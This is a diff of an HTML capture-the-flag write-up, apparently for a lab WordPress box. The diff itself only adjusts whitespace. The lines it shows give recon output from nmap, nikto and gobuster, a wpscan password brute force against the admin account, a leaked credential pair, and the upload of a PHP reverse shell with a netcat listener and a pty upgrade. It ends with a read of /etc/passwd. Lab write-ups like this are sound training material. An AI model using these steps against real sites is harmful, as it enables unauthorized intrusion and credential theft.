@@ -4,7 +4,7 @@
 <span class=nb>echo</span> <span class=nv>$IP</span>
 nmap -sC -sV <span class=nv>$IP</span>
 nikto -h <span class=nv>$IP</span>
-</code></pre></div> <details class=output><summary>Nmap output</summary><div class=highlight><pre><span></span><code>nmap -sC -sV <span class=nv>$IP</span>
+</code></pre></div> <details class=output> <summary>Nmap output</summary> <div class=highlight><pre><span></span><code>nmap -sC -sV <span class=nv>$IP</span>
 Nmap scan report <span class=k>for</span> <span class=m>10</span>.10.156.30
 Host is up <span class=o>(</span><span class=m>0</span>.020s latency<span class=o>)</span>.
 Not shown: <span class=m>998</span> closed ports
@@ -21,7 +21,7 @@ Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned <span class=k>in</span> <span class=m>8</span>.50 seconds
-</code></pre></div> </details> <details class=output><summary>nikto output</summary><div class=highlight><pre><span></span><code>nikto -h <span class=nv>$IP</span>
+</code></pre></div> </details> <details class=output> <summary>nikto output</summary> <div class=highlight><pre><span></span><code>nikto -h <span class=nv>$IP</span>
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          <span class=m>10</span>.10.156.30
@@ -44,14 +44,14 @@ Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>
 + <span class=m>8042</span> requests: <span class=m>0</span> error<span class=o>(</span>s<span class=o>)</span> and <span class=m>11</span> item<span class=o>(</span>s<span class=o>)</span> reported on remote host
 ---------------------------------------------------------------------------
 + <span class=m>1</span> host<span class=o>(</span>s<span class=o>)</span> tested
-</code></pre></div> </details> <details class=output><summary>gobuster output</summary><div class=highlight><pre><span></span><code>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
+</code></pre></div> </details> <details class=output> <summary>gobuster output</summary> <div class=highlight><pre><span></span><code>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
 ===============================================================
 /blog                 (Status: 301) [Size: 311] [--&gt; http://10.10.156.30/blog/]
 /wordpress            (Status: 301) [Size: 316] [--&gt; http://10.10.156.30/wordpress/]
 /javascript           (Status: 301) [Size: 317] [--&gt; http://10.10.156.30/javascript/]
 /phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://10.10.156.30/phpmyadmin/]
 /server-status        (Status: 403) [Size: 277]
-</code></pre></div> </details> <details class=output><summary>Wordpress output</summary><div class=highlight><pre><span></span><code>wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
+</code></pre></div> </details> <details class=output> <summary>Wordpress output</summary> <div class=highlight><pre><span></span><code>wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
 _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
@@ -120,7 +120,7 @@ Trying admin / lizzy Time: 00:01:19 &lt;                                        
 
 [!] No WPScan API Token given, as a result vulnerability data has not been output.
 [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-</code></pre></div> </details> <p>So now we can login to wordpress as admin and look around.</p> <p>The wordpress page reveals a private note on credentals of william being william:arnold147 sofar this doesnt seem usable</p> <h2 id=wordpress-php-reverse-shell>Wordpress php reverse shell</h2> <p>I used this <a href=https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php>php reverse shell</a>, modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g. <code>nc -lvnp 6666</code> and call a page that doesn't exist e.g. <code>/blog/index.php/2020/08/03/50/</code> with e.g. curl.</p> <p>We now get a reverse shell but no TTY so we can try this: <code>python -c 'import pty; pty.spawn("/bin/sh")'</code> or this <code>/bin/sh -i</code>.</p> <p>Let's have a look around:</p> <details class=output><summary>cat /etc/passwd output</summary><div class=highlight><pre><span></span><code>cat /etc/passwd
+</code></pre></div> </details> <p>So now we can login to wordpress as admin and look around.</p> <p>The wordpress page reveals a private note on credentals of william being william:arnold147 sofar this doesnt seem usable</p> <h2 id=wordpress-php-reverse-shell>Wordpress php reverse shell</h2> <p>I used this <a href=https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php>php reverse shell</a>, modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g. <code>nc -lvnp 6666</code> and call a page that doesn't exist e.g. <code>/blog/index.php/2020/08/03/50/</code> with e.g. curl.</p> <p>We now get a reverse shell but no TTY so we can try this: <code>python -c 'import pty; pty.spawn("/bin/sh")'</code> or this <code>/bin/sh -i</code>.</p> <p>Let's have a look around:</p> <details class=output> <summary>cat /etc/passwd output</summary> <div class=highlight><pre><span></span><code>cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
